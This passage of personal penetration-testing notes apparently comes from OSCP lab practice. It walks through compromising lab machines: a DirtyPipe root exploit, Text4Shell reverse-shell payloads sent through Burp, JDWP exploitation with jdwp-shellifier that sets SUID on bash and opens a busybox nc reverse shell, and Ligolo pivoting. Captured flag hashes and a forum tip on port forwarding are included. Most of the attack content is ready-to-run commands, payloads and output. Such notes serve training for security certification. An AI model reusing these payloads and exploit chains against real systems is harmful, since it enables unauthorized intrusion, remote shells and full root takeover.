+   Comments: ip_tables kernel module must be loaded
+
+╔══════════╣ Analyzing FTP Files (limit 70)
+-rw-r--r-- 1 root root 6055 Nov 21  2022 /etc/vsftpd.conf                                        
+anonymous_enable
+local_enable=YES
+#write_enable=YES
+#anon_upload_enable=YES
+#anon_mkdir_write_enable=YES
+#chown_uploads=YES
+#chown_username=whoever
+-rw-r--r-- 1 root root 41 Jun 18  2015 /usr/lib/tmpfiles.d/vsftpd.conf
+-rw-r--r-- 1 root root 506 Mar  6  2019 /usr/share/doc/vsftpd/examples/INTERNET_SITE/vsftpd.conf
+anonymous_enable
+local_enable
+write_enable
+anon_upload_enable
+anon_mkdir_write_enable
+anon_other_write_enable
+-rw-r--r-- 1 root root 564 Mar  6  2019 /usr/share/doc/vsftpd/examples/INTERNET_SITE_NOINETD/vsftpd.conf                                                                                          
+anonymous_enable
+local_enable
+write_enable
+anon_upload_enable
+anon_mkdir_write_enable
+anon_other_write_enable
+-rw-r--r-- 1 root root 260 Feb  2  2008 /usr/share/doc/vsftpd/examples/VIRTUAL_USERS/vsftpd.conf
+anonymous_enable
+local_enable=YES
+write_enable
+anon_upload_enable
+anon_mkdir_write_enable
+anon_other_write_enable
+
+╔══════════╣ SGID
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                 
+-rwsrwsr-x 1 root root 17K Nov 21  2022 /home/john/RESET_PASSWD (Unknown SGID binary)  
+
+
+			[+] [CVE-2022-0847] DirtyPipe
+			https://github.com/n3rada/DirtyPipe
+
+Compile the exploit statically:
+┌──(kali㉿kali)-[~/Desktop/B/149]
+└─$ gcc -o dpipe dpipe.c -static
+
+And retrieve-it from your target before launching-it:
+
+┌──(kali㉿kali)-[~/Desktop/B/149]
+└─$ python3 -m http.server 8000
+
+john@oscp:/tmp$ wget http://192.168.45.180:8000/dpipe
+john@oscp:/tmp$ chmod +x dpipe
+
+john@oscp:/tmp$ ./dpipe --root
+[Dirty Pipe] Attempting to backup '/etc/passwd' to '/tmp/passwd.bak'
+[Dirty Pipe] Successfully backed up '/etc/passwd' to '/tmp/passwd.bak'
+[Dirty Pipe] Initiating write to '/etc/passwd'...
+[Dirty Pipe] Data size to write: 131 bytes
+[Dirty Pipe] File '/etc/passwd' opened successfully for reading.
+[Dirty Pipe] Pipe size determined: 65536 bytes
+[Dirty Pipe] Filling the pipe...
+[Dirty Pipe] Pipe filled successfully.
+[Dirty Pipe] Draining the pipe...
+[Dirty Pipe] Pipe drained successfully.
+[Dirty Pipe] Data successfully written to '/etc/passwd'.
+[Dirty Pipe] You can connect as root with password 'el3ph@nt!'
+[Dirty Pipe] Program execution completed successfully.
+
+john@oscp:/tmp$ su root
+Password: el3ph@nt!
+
+# whoami
+root
+
+# id
+uid=0(root) gid=0(root) groups=0(root)
+
+
+--------------------------------------------------------------------------------------------------
+			192.168.154.150 - Berlin ✅
+SSH: 22
+HTTP: 8080
+				NMAP: TCP
+nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- 192.168.154.150
+
+SSH: 22
+22/tcp   open  ssh        syn-ack OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 ad:ac:80:0a:5f:87:44:ea:ba:7f:95:ca:1e:90:78:0d (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJd29JTebYP69ra4ytUe62mCoc9DwxkxNHcv3CPoGw9aycFL+LD0Mz298Z7vKvrdw4d8idm7itnSVd4WdUPWIAg=
+|   256 b3:ae:d1:25:24:c2:ab:4f:f9:40:c5:f0:0b:12:87:bb (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBTxgK669LGu5ZfUwXQJp4YOMOyvGsRmjWXm6uGFZV1Q
+
+HTTP: 8080
+8080/tcp open  http-proxy syn-ack
+|_http-favicon: Spring Java Framework
+| http-methods: 
+|_  Supported Methods: GET HEAD OPTIONS
+|_http-open-proxy: Proxy might be redirecting requests
+|_http-title: Site doesn't have a title (text/plain;charset=UTF-8).
+| fingerprint-strings: 
+|   FourOhFourRequest: 
+|     HTTP/1.1 404 
+|     Content-Type: application/json;charset=UTF-8
+|     Date: Wed, 08 May 2024 04:50:37 GMT
+|     Connection: close
+|     {"timestamp":"2024-05-08T04:50:38.203+0000","status":404,"error":"Not Found","message":"No message available","path":"/nice%20ports%2C/Tri%6Eity.txt%2ebak"}
+|   GetRequest: 
+|     HTTP/1.1 200 
+|     Content-Type: text/plain;charset=UTF-8
+|     Content-Length: 19
+|     Date: Wed, 08 May 2024 04:50:37 GMT
+|     Connection: close
+|     {"api-status":"up"}
+|   HTTPOptions: 
+|     HTTP/1.1 200 
+|     Allow: GET,HEAD,OPTIONS
+|     Content-Length: 0
+|     Date: Wed, 08 May 2024 04:50:37 GMT
+|     Connection: close
+|   RTSPRequest: 
+|     HTTP/1.1 505 
+|     Content-Type: text/html;charset=utf-8
+|     Content-Language: en
+|     Content-Length: 830
+|     Date: Wed, 08 May 2024 04:50:37 GMT
+|     <!doctype html><html lang="en"><head><title>HTTP Status 505 
+|     HTTP Version Not Supported</title><style type="text/css">h1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} h2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} h3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} body {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} b {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} p {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;} a {color:black;} a.name {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1
+|   Socks5: 
+|     HTTP/1.1 400 
+|     Content-Type: text/html;charset=utf-8
+|     Content-Language: en
+|     Content-Length: 800
+|     Date: Wed, 08 May 2024 04:50:37 GMT
+|     Connection: close
+|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
+|_    Request</title><style type="text/css">h1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} h2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} h3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} body {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} b {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} p {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;} a {color:black;} a.name {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body
+1 service unrecognized despite returning data. If you know the service/version, please submit the following 
+
+				NMAP: UDP
+sudo nmap -sU -O 192.168.154.150
+All 1000 scanned ports on 192.168.154.150 are in ignored states.
+
+
+				SSH: 22
+
+				HTTP: 8080
+http://192.168.154.150:8080/
+http://192.168.154.150:8080/search
+http://192.168.154.150:8080/nice%20ports%2C/Tri%6Eity.txt.bak
+http://192.168.154.150:8080/functionRouter
+http://192.168.154.150:8080/CHANGELOG
+
+┌──(kali㉿kali)-[~]
+└─$ feroxbuster -u http://192.168.154.150:8080/ -t 30 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x "txt,html,php,asp,aspx,jsp" -v -k -n -e  
+
+feroxbuster -u http://192.168.154.150:8080/ -t 30 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x "txt,html,php,asp,aspx,jsp" -v -k -n -e 
+
+
+┌──(kali㉿kali)-[~]
+└─$ searchsploit Spring Java Framework
+Spring Cloud Config 2.1.x - Path Traversal (Metasploit)        | java/webapps/46772.rb
+
+┌──(kali㉿kali)-[~]
+└─$ searchsploit Spring Java          
+Spring Cloud 3.2.2 - Remote Command Execution (RCE)            | java/webapps/51577.py
+Spring Cloud Config 2.1.x - Path Traversal (Metasploit)        | java/webapps/46772.rb
+Spring Cloud Config 2.1.x - Path Traversal (Metasploit)        | java/webapps/46772.rb
+Spring Cloud Gateway 3.1.0 - Remote Code Execution (RCE)       | java/webapps/50799.py
+Spring Data REST < 2.6.9 (Ingalls SR9) / 3.0.1 (Kay SR1) - PAT | java/webapps/44289.java
+Spring Security OAuth - Open Redirector                        | java/webapps/47000.txt
+
+
+DIDNT WORK: 
+CVE: 2022-22963
+Spring Cloud 3.2.2 - Remote Command Execution (RCE)
+https://www.exploit-db.com/exploits/51577
+
+┌──(kali㉿kali)-[~/Desktop/B/150]
+└─$ chmod +x 51577.py   
+
+┌──(kali㉿kali)-[~/Desktop/B/150]
+└─$ sudo python3 51577.py --url 'http://192.168.154.150:8080/nice%20ports%2C/Tri%6Eity.txt.bak' --command 'whoami'
+
+[!] It is possible that the output of the injected command is not reflected in the response, to validate if the server is vulnerable run a ping or curl to the attacking host                     
+                                                                                                 
+{                                                                                                
+  "timestamp": "2024-05-08T07:35:03.753+0000",                                                   
+  "status": 404,                                                                                 
+  "error": "Not Found",                                                                          
+  "message": "No message available",                                                             
+  "path": "/nice%20ports%2C/Trinity.txt.bak"                                                     
+}  
+
+sudo python3 51577.py --url 'http://192.168.154.150:8080/' --command 'id'
+sudo python3 51577.py --url 'http://192.168.154.150:8080/functionRouter' --command 'id'
+http://192.168.154.150:8080/
+
+
+DIDNT WORK: 
+https://github.com/J0ey17/CVE-2022-22963_Reverse-Shell-Exploit
+To use this exploit, simply run the script with the -u option to specify the URL of the vulnerable server. The script will check if the server is vulnerable and prompt the user if they want to attempt to take a reverse shell. If the user chooses to proceed, the script will open a netcat listener and attempt to execute the specified command on the target server.
+
+┌──(kali㉿kali)-[~/Desktop/B/150]
+└─$ chmod +x CVE-2022-22963.py
+
+┌──(kali㉿kali)-[~/Desktop/B/150]
+└─$ sudo python3 CVE-2022-22963.py --url 'http://192.168.154.150:8080/nice%20ports%2C/Tri%6Eity.txt.bak'
+[+] Target http://192.168.154.150:8080/nice%20ports%2C/
+[+] Checking if http://192.168.154.150:8080/nice%20ports%2C/ is vulnerable to CVE-2022-22963...
+[-] http://192.168.154.150:8080/nice%20ports%2C/ is not vulnerable
+
+┌──(kali㉿kali)-[~/Desktop/B/150]
+└─$ sudo python3 CVE-2022-22963.py --url 'http://192.168.154.150:8080/nice%20ports%2C/Tri%6Eity.txt.bak'
+[+] Target http://192.168.154.150:8080/nice%20ports%2C/Tri%6Eity.txt.bak
+[+] Checking if http://192.168.154.150:8080/nice%20ports%2C/Tri%6Eity.txt.bak is vulnerable to CVE-2022-22963...
+[-] http://192.168.154.150:8080/nice%20ports%2C/Tri%6Eity.txt.bak is not vulnerable
+
+┌──(kali㉿kali)-[~/Desktop/B/150]
+└─$ sudo python3 CVE-2022-22963.py --url 'http://192.168.154.150:8080/functionRouter'                          
+[+] Target http://192.168.154.150:8080
+[+] Checking if http://192.168.154.150:8080 is vulnerable to CVE-2022-22963...
+[-] http://192.168.154.150:8080 is not vulnerable
+
+
+DIDNT WORK: 
+Spring Cloud Gateway 3.1.0 - Remote Code Execution (RCE)
+https://www.exploit-db.com/exploits/50799
+    #   Usage:                                        #
+    #   python3 exploit.py <url> <command>            #
+    #                                                 #
+    #   Example:                                      #
+    #   python3 exploit.py http://localhost:8080 'id' 
+
+┌──(kali㉿kali)-[~/Desktop/B/150]
+└─$ sudo python3 50799.py http://192.168.154.150:8080 'id' 
+
+┌──(kali㉿kali)-[~/Desktop/B/150]
+└─$ sudo python3 50799.py http://192.168.154.150:8080/functionRouter 'id' 
+
+
+
+		CVE-2022-42889 Text4Shell Vulnerability
+https://github.com/gustanini/CVE-2022-42889-Text4Shell-POC
+https://infosecwriteups.com/text4shell-poc-cve-2022-42889-f6e9df41b3b7
+
+IDENTIFIED: 
+http://192.168.217.150:8080/CHANGELOG
+Apache Commons Text 1.8
+- Using Apache Commons versions 1.5 to 1.9
+
+http://192.168.217.150:8080/
+http://192.168.217.150:8080/search
+http://192.168.217.150:8080/nice%20ports%2C/Tri%6Eity.txt.bak
+http://192.168.217.150:8080/functionRouter
+http://192.168.217.150:8080/CHANGELOG
+
+CVE-2022-42889-Text4Shell-POC: 
+python text4shell.py -u 'http://example.com/search?query=' -c 'your_command' -m 'rce'
+    # Payload creation & encoding
+    js_command = f"${{script:javascript:java.lang.Runtime.getRuntime().exec('{args.command}')}}"
+    js_command_encoded = urllib.parse.quote(js_command)
+
+think of firewall , usually 443, 80 is your best best to have allowed rules there
+
+REVERSE SHELL: 
+https://www.revshells.com/
+/search?query=${script:javascript:java.lang.Runtime.getRuntime().exec('busybox nc 192.168.45.190 443 -e /bin/sh')}
+
+┌──(kali㉿kali)-[~]
+└─$ nc -nvlp 443
+
+CURL: DIDINT WORK 
+https://www.urldecoder.org/
+┌──(kali㉿kali)-[~/Desktop/B/150]
+└─$ curl http://192.168.217.150/search%3Fquery%3D%0A%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29.exec%28%27busybox%20nc%20192.168.45.206%2080%20-e%20%2Fbin%2Fsh%27%29%7D
+.exec(%27wget%20192.168.45.206:8080%2Fshell%20-O%20%2Ftmp%2Fshell%27)%7D: command not found
+
+
+BURP: WORKS  
+GET /search?query=%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29.exec%28%27busybox%20nc%20192.168.45.161%20443%20-e%20%2Fbin%2Fsh%27%29%7D HTTP/1.1
+Host: 192.168.214.150:8080
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+┌──(kali㉿kali)-[~]
+└─$ nc -nvlp 443
+listening on [any] 443 ...
+connect to [192.168.45.206] from (UNKNOWN) [192.168.217.150] 32856
+
+
+				Local.txt
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+dev@oscp:/$ 
+
+dev@oscp:/$ whoami
+dev
+
+dev@oscp:/$ id
+uid=1001(dev) gid=1001(dev) groups=1001(dev)
+
+dev@oscp:/$ hostname
+oscp
+
+dev@oscp:/$ find / -name "local.txt" -ls 2> /dev/null
+   533520      4 -rw-r-----   1 dev      dev            33 May  9 06:22 /home/dev/local.txt
+
+dev@oscp:/$ cat /home/dev/local.txt
+1f54547742a191486cf6779249e751c0
+
+				PRIV ESC: proof.txt
+dev@oscp:/opt/dev$ sudo -l
+[sudo] password for dev: 
+
+python3 -m http.server 8000
+
+LINPEAS: 
+dev@oscp:/tmp$ wget http://192.168.45.206:8000/linpeas.sh
+dev@oscp:/tmp$ chmod +x linpeas.sh
+dev@oscp:/tmp$ ./linpeas.sh
+
+LINPEAS:
+Writable folder: /dev/shm
+Distributor ID: Ubuntu
+Description: Ubuntu 22.04.1 LTS
+Release: 22.04
+Codename: jammy
+
+╔══════════╣ Executing Linux Exploit Suggester
+╚ https://github.com/mzet-/linux-exploit-suggester                                               
+cat: write error: Broken pipe                                                                    
+cat: write error: Broken pipe
+[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)
+   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
+https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
+   Exposure: probable
+   Tags: [ ubuntu=(22.04) ]{kernel:5.15.0-27-generic}
+   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
+   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)
+[+] [CVE-2022-2586] nft_object UAF
+   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
+   Exposure: less probable
+   Tags: ubuntu=(20.04){kernel:5.12.13}
+   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
+   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)
+[+] [CVE-2022-0847] DirtyPipe
+   Details: https://dirtypipe.cm4all.com/
+   Exposure: less probable
+   Tags: ubuntu=(20.04|21.04),debian=11
+   Download URL: https://haxx.in/files/dirtypipez.c
+[+] [CVE-2021-4034] PwnKit
+   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
+   Exposure: less probable
+   Tags: ubuntu=10|11|12|13|14|15|16|17|18|19|20|21,debian=7|8|9|10|11,fedora,manjaro
+   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main
+[+] [CVE-2021-3156] sudo Baron Samedit
+   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
+   Exposure: less probable
+   Tags: mint=19,ubuntu=18|20, debian=10
+   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main
+[+] [CVE-2021-3156] sudo Baron Samedit 2
+   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
+   Exposure: less probable
+   Tags: centos=6|7|8,ubuntu=14|16|17|18|19|20, debian=9|10
+   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main
+[+] [CVE-2021-22555] Netfilter heap out-of-bounds write
+   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
+   Exposure: less probable
+   Tags: ubuntu=20.04{kernel:5.8.0-*}
+   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
+   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
+   Comments: ip_tables kernel module must be loaded
+[+] [CVE-2017-5618] setuid screen v4.5.0 LPE
+   Details: https://seclists.org/oss-sec/2017/q1/184
+   Exposure: less probable
+   Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154
+
+╔══════════╣ Cleaned processes
+root         852  0.0  1.7 2528964 34580 ?       Ssl  06:18   0:00 java -Xdebug -Xrunjdwp:transport=dt_socket,address=8000,server=y /opt/stats/App.java
+
+╔══════════╣ Active Ports
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports                    
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp6       0      0 :::8080                 :::*                    LISTEN      835/java            
+tcp6       0      0 :::22                   :::*                    LISTEN      -    
+
+╔══════════╣ Users with console
+dev:x:1001:1001:,,,:/home/dev:/bin/bash                                                          
+root:x:0:0:root:/root:/bin/bash
+user:x:1000:1000:user:/home/user:/bin/bash
+
+
+				DIRTYPIPE: DIDNT WORK
+wget http://192.168.45.206:80/dpipe
+chmod +x dpipe
+./dpipe --root
+dev@oscp:/tmp$ su root
+Password: el3ph@nt!
+su: Authentication failure
+
+
+				CHECK RUNNING PROCESSES: 
+Review the process list. Do you know what every process is doing? What about every process's arguments?
+
+╔══════════╣ Active Ports
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports                    
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp6       0      0 :::8080                 :::*                    LISTEN      835/java            
+tcp6       0      0 :::22                   :::*                    LISTEN      -    
+
+CURL: 
+tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                   
+dev@oscp:/tmp$ curl http://127.0.0.1:8000
+curl: (56) Recv failure: Connection reset by peer
+
+PSPY: 
+dev@oscp:/tmp$ wget http://192.168.45.206:8000/pspy64  
+dev@oscp:/tmp$ chmod +x pspy64 
+dev@oscp:/tmp$ ./pspy64
+
+dev@oscp:/$ ps aux
+root         852  0.0  1.7 2528964 34824 ?       Ssl  06:18   0:00 java -Xdebug -Xrunjdwp:transport=dt_socket,address=8000,server=y /opt/stats/App.java
+
+dev@oscp:/opt/stats$ cat App.java
+import java.io.IOException;
+import java.io.InputStream;
+import java.io.OutputStream;
+import java.net.ServerSocket;
+import java.net.Socket;
+
+class StatsApp {
+    public static void main(String[] args) {
+        System.out.println("System Stats\n");
+        Runtime rt = Runtime.getRuntime();
+        String output = new String();
+
+        try {
+            ServerSocket echod = new ServerSocket(5000);
+            while (true) {
+              output = "";
+              output += "Available Processors: " + rt.availableProcessors() +"\r\n";
+              output += "Free Memory: " + rt.freeMemory() + "\r\n";
+              output += "Total Memory: " + rt.totalMemory() +"\r\n";
+
+              Socket socket = echod.accept();
+              InputStream in = socket.getInputStream();
+              OutputStream out = socket.getOutputStream();
+              out.write((output + "\r\n").getBytes());
+              System.out.println(output);
+            }
+        } catch (IOException e) {
+            System.err.println(e.toString());
+            System.exit(1);
+        }
+    }
+}
+
+
+				JDWP - Java Debug Wire Protocol
+https://book.hacktricks.xyz/network-services-pentesting/pentesting-jdwp-java-debug-wire-protocol
+https://github.com/IOActive/jdwp-shellifier
+https://github.com/IOActive/jdwp-shellifier/blob/master/jdwp-shellifier.py
+
+
+				PORT FORWARD: Ligalo
+kali㉿kali $ sudo ip tuntap add user kali mode tun ligolo
+kali㉿kali $ sudo ip link set ligolo up
+kali㉿kali $ ./proxy -selfcert
+
+kali㉿kali $ python3 -m http.server 80
+dev@oscp:/tmp$ wget http://192.168.45.161:80/agent
+dev@oscp:/tmp$ chmod +x agent
+dev@oscp:/tmp$ ./agent -connect 192.168.45.161:11601 -ignore-cert
+
+ligolo-ng » session
+? Specify a session : 1 - #1 - dev@oscp - 192.168.214.150:49286
+1
+dev@oscp:/$ ifconfig
+kali㉿kali $ sudo ip route add 192.168.214.0/24 dev ligolo
+kali㉿kali $ ip route
+[Agent : dev@oscp] » start
+[Agent : dev@oscp] » INFO[0133] Starting tunnel to dev@oscp      
+
+
+				SET UP LISTENER: Ligalo
+# Access to agent's local ports (127.0.0.1)
+kali㉿kali $ sudo ip route add 240.0.0.1/32 dev ligolo
+
+[Agent : dev@oscp] » listener_list
+[Agent : dev@oscp] » ifconfig
+[Agent : dev@oscp] » listener_add --addr 0.0.0.0:1235 --to 127.0.0.1:8000
+INFO[0670] Listener 0 created on remote agent!
+[Agent : dev@oscp] » listener_list
+
+[Agent : dev@oscp] » ERRO[1064] dial tcp 127.0.0.1:8000: connect: connection refused 
+
+┌──(kali㉿kali)-[~]
+└─$ nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- 240.0.0.1   
+22/tcp   open  ssh            syn-ack OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 ad:ac:80:0a:5f:87:44:ea:ba:7f:95:ca:1e:90:78:0d (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJd29JTebYP69ra4ytUe62mCoc9DwxkxNHcv3CPoGw9aycFL+LD0Mz298Z7vKvrdw4d8idm7itnSVd4WdUPWIAg=
+|   256 b3:ae:d1:25:24:c2:ab:4f:f9:40:c5:f0:0b:12:87:bb (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBTxgK669LGu5ZfUwXQJp4YOMOyvGsRmjWXm6uGFZV1Q
+1235/tcp open  mosaicsyssvc1? syn-ack
+8000/tcp open  jdwp           syn-ack unknown
+|_jdwp-info: ERROR: Script execution failed (use -d to debug)
+8080/tcp open  http-proxy     syn-ack
+| http-methods: 
+|_  Supported Methods: GET HEAD OPTIONS
+|_http-favicon: Spring Java Framework
+|_http-open-proxy: Proxy might be redirecting requests
+|_http-title: Site doesn't have a title (text/plain;charset=UTF-8).
+| fingerprint-strings: 
+|   FourOhFourRequest: 
+|     HTTP/1.1 404 
+|     Content-Type: application/json;charset=UTF-8
+|     Date: Fri, 10 May 2024 02:26:13 GMT
+|     Connection: close
+|     {"timestamp":"2024-05-10T02:26:13.624+0000","status":404,"error":"Not Found","message":"No message available","path":"/nice%20ports%2C/Tri%6Eity.txt%2ebak"}
+|   GetRequest: 
+|     HTTP/1.1 200 
+|     Content-Type: text/plain;charset=UTF-8
+|     Content-Length: 19
+|     Date: Fri, 10 May 2024 02:26:13 GMT
+|     Connection: close
+|     {"api-status":"up"}
+|   HTTPOptions: 
+|     HTTP/1.1 200 
+|     Allow: GET,HEAD,OPTIONS
+|     Content-Length: 0
+|     Date: Fri, 10 May 2024 02:26:13 GMT
+|     Connection: close
+|   RTSPRequest: 
+|     HTTP/1.1 505 
+|     Content-Type: text/html;charset=utf-8
+|     Content-Language: en
+|     Content-Length: 830
+|     Date: Fri, 10 May 2024 02:26:13 GMT
+|     <!doctype html><html lang="en"><head><title>HTTP Status 505 
+
+
+				USE ALTERNATIVE localhost:
+┌──(kali㉿kali)-[~/Desktop/B/150]
+└─$ chmod +x jdwp-shellifier.py 
+
+┌──(kali㉿kali)-[~/Desktop/B/150]
+└─$ python2 jdwp-shellifier.py -t 127.0.0.1 -p 8000 --cmd "chmod u+s /bin/bash" 
+[-] Exception: Failed to connect: [Errno 111] Connection refused
+
+┌──(kali㉿kali)-[~/Desktop/B/150]
+└─$ python2 jdwp-shellifier.py -t 240.0.0.1 -p 8000 --cmd "chmod u+s /bin/bash" 
+[+] Targeting '240.0.0.1:8000'
+[+] Reading settings for 'OpenJDK 64-Bit Server VM - 11.0.16'
+[+] Found Runtime class: id=863
+[+] Found Runtime.getRuntime(): id=7f4a1c3175e0
+[+] Created break event id=2
+[+] Waiting for an event on 'java.net.ServerSocket.accept'
+
+Then you still need to initiate the connection because the target will wait until there is some interaction, this will look like its frozen and nothing happening to fix that you can then run on the target:
+
+dev@oscp:/$ nc 127.0.0.1 5000 
+Available Processors: 1
+Free Memory: 25095832
+Total Memory: 32440320
+
+[+] Received matching event from thread 0x8ff
+[+] Selected payload 'chmod u+s /bin/bash'
+[+] Command string object created id:900
+[+] Runtime.getRuntime() returned context id:0x901
+[+] found Runtime.exec(): id=7f4a1c317618
+[+] Runtime.exec() successful, retId=902
+[!] Command successfully executed
+
+				REVERSE SHELL: 
+			https://github.com/IOActive/jdwp-shellifier
+				https://www.revshells.com/
+┌──(kali㉿kali)-[~/Desktop/B/150]
+└─$ python2 jdwp-shellifier.py -t 240.0.0.1 -p 8000 --cmd "busybox nc 192.168.45.161 1234 -e sh"
+[+] Targeting '240.0.0.1:8000'
+[+] Reading settings for 'OpenJDK 64-Bit Server VM - 11.0.16'
+[+] Found Runtime class: id=8b1
+[+] Found Runtime.getRuntime(): id=7f4a1c3175e0
+[+] Created break event id=2
+[+] Waiting for an event on 'java.net.ServerSocket.accept'
+
+Then you still need to initiate the connection because the target will wait until there is some interaction, this will look like its frozen and nothing happening to fix that you can then run on the target:
+
+dev@oscp:/$ nc 127.0.0.1 5000 
+Available Processors: 1
+Free Memory: 25095832
+Total Memory: 32440320
+
+[+] Received matching event from thread 0x94d
+[+] Selected payload 'busybox nc 192.168.45.161 1234 -e sh'
+[+] Command string object created id:94e
+[+] Runtime.getRuntime() returned context id:0x94f
+[+] found Runtime.exec(): id=7f4a1c317618
+[+] Runtime.exec() successful, retId=950
+[!] Command successfully executed
+
+┌──(kali㉿kali)-[~]
+└─$ nc -nvlp 1234  
+listening on [any] 1234 ...
+connect to [192.168.45.161] from (UNKNOWN) [192.168.214.150] 40140
+
+root@oscp:/root# whoami
+root
+
+root@oscp:/root# id
+uid=0(root) gid=0(root) groups=0(root)
+
+root@oscp:/root# cat proof.txt
+96cbe9fbbe9cd4a0e5308ed12c45dee5
+
+---------------------------------------------
+https://discord.com/channels/780824470113615893/1087927556604432424/1212746823089786960
+
+Ligolo works easily and does the heavy lift - (sorry for long post, but would be nice so others can see it here, also will pin it)
+    MS01 has 10.10.123.148 as 2nd IP
+    Kali IP is 192.168.45.203
+    MS02 can't reach KALI , so needs to go through MS01 to reach Kali , right?
+
+Mindset : Let's say you want to download a file from your KALI like usual where you opened this -> 
+python3 -m http.server 80
+
+You have opened server on 192.168.45.203:80   , but MS02 ONLY reaches MS01 , so you need to port forward . 
+To make thing simple for myself I added a listener that does this port forwarding MS:80 to KALI:80 , looks like  this on session 1 (where MS01 is connected)-> 
+listener_add --addr 0.0.0.0:80 --to 127.0.0.1:80 --tcp
+
+How to reach Kali IP now to download something? On MS02 a command like this -> wget MS01:80 , and will redirect to KALI:80 .. 
+In your care (just as an example, don't take it blindly copy paste), 
+powershell wget http://10.10.123.148:80/test
+
+And that's it .. 
+SAME goes for let's say a reverse shell .. add a new listener but with port 443 for example , and so on! 
+
+IF that is not working either, consider you are ADMIN on the first pivot machine , you can play with that machine to do WATHEVER you need.. what do you think , adding a rule to have port 80 and 443 in exceptions could do the trick? Play around , and read about this again, and again. Took me 1 hour to play with this and understand the principle how it works .
+
+
+--------------------------------------------------------------------------------------------------
+			192.168.154.151 - Gust ✅
+HTTP: 80
+RDP: 3389
+FreeSWITCH: 8021
+				NMAP: TCP
+nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- 192.168.154.151
+
+HTTP: 80
+80/tcp   open  http             syn-ack Microsoft IIS httpd 10.0
+| http-methods: 
+|   Supported Methods: OPTIONS TRACE GET HEAD POST
+|_  Potentially risky methods: TRACE
+|_http-title: IIS Windows
+|_http-server-header: Microsoft-IIS/10.0
+
+RDP: 3389
+3389/tcp open  ms-wbt-server    syn-ack Microsoft Terminal Services
+|_ssl-date: 2024-05-08T04:58:51+00:00; -2s from scanner time.
+| ssl-cert: Subject: commonName=OSCP
+| Issuer: commonName=OSCP
